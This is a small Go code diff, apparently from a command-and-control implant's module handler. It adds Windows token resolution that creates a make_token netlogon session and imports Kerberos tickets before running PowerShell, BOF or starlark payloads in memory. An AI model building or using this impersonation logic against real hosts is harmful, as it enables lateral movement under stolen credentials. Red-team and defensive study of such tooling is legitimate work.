@@ -49,6 +49,17 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 		return logging.Sprintf("uploading module files: %v", err)
 	}
 
+	// Resolve the token context: --token/--user/--ticket (Windows). This may
+	// create a make_token netlogon session for --user and import --ticket
+	// into the resolved session before the module executes, so Kerberos-bound
+	// BOFs/starlark modules see the ticket. The resolved key (SID or session
+	// name) replaces invocation.Token for executeWithToken below.
+	tokenKey, err := resolveTokenKey(invocation)
+	if err != nil {
+		return logging.Sprintf("resolving module token context: %v", err)
+	}
+	invocation.Token = tokenKey
+
 	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
